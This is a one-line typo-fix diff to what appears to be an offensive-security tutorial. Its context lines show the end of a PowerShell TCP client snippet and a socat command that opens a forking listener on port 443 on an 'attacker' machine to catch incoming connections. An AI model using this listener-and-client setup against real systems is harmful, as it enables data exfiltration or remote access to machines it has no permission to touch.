@@ -160,7 +160,7 @@ $client.Connect($target,$port);
 $client.Close();
 ```
 
-In our "attacker" machine i will use [Socat](http://www.dest-unreach.org/socat/) instead Netcat, because this give us a lot of new options that Netcat will no support, such as fork connections to allow multiple connections, create an SSL Channel and so on.
+In our "attacker" machine I will use [Socat](http://www.dest-unreach.org/socat/) instead Netcat, because this give us a lot of new options that Netcat will no support, such as fork connections to allow multiple connections, create an SSL Channel and so on.
 
 ```shell
 sudo socat -d -d TCP4-LISTEN:443,fork STDOUT
